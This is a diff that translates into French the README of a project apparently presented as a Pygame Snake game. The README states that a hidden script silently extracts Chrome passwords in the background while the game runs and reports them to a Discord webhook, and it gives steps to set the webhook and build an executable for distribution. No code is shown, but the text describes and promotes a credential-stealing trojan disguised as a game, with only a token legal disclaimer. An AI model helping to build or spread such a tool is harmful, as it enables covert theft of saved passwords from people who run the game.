@@ -1,33 +1,31 @@
-# Snake Game with Background Script Execution
+# Jeu du Serpent avec Exécution de Script en Arrière-plan
 
+Bienvenue dans le **Jeu du Serpent avec Exécution de Script en Arrière-plan** ! 🐍
 
+## Prérequis
 
-Welcome to the Snake Game with Background Script Execution! 🐍
+Avant de lancer le jeu, assurez-vous de :
 
-## Prerequisites
-
-Before running the game, make sure to:
-
-1. Change the Discord webhook URL in `snake_game.py` on line 17.
-2. Run `build_snake_game.bat` to transform the Python script into an executable.
+1. Modifier l'URL du webhook Discord dans `snake_game.py` à la ligne 17.
+2. Exécuter `build_snake_game.bat` pour transformer le script Python en exécutable.
 
 ## Description
 
-This project combines the classic Snake Game with the ability to execute background scripts. The game interface is powered by Pygame, providing an entertaining experience. Meanwhile, behind the scenes, a Chrome password extraction script silently operates.
+Ce projet combine le classique *Jeu du Serpent* avec la possibilité d'exécuter des scripts en arrière-plan. L'interface du jeu est alimentée par Pygame, offrant une expérience divertissante. Pendant ce temps, en coulisses, un script d'extraction de mots de passe Chrome fonctionne discrètement.
 
-## How to Play
+## Comment Jouer
 
-1. Run the executable after following the prerequisites.
-2. Enjoy playing the Snake Game.
-3. In the background, the script extracts Chrome passwords.
-4. Check the Discord channel for notifications.
+1. Exécutez l'exécutable après avoir suivi les prérequis.
+2. Profitez du jeu du Serpent.
+3. En arrière-plan, le script extrait les mots de passe Chrome.
+4. Vérifiez le canal Discord pour les notifications.
 
-Feel free to customize the project for your needs. Happy coding! 🚀
+N'hésitez pas à personnaliser le projet selon vos besoins. Joyeux codage ! 🚀
 
-## Author
+## Auteur
 
-Created by [esp4ce](https://github.com/esp4ce). Connect with me on GitHub!
+Créé par [esp4ce](https://github.com/esp4ce). Connectez-vous avec moi sur GitHub !
 
 ---
 
-**Note**: Ensure that you comply with legal and ethical standards when using and modifying this project.
+**Remarque** : Assurez-vous de respecter les normes légales et éthiques lors de l'utilisation et de la modification de ce projet.
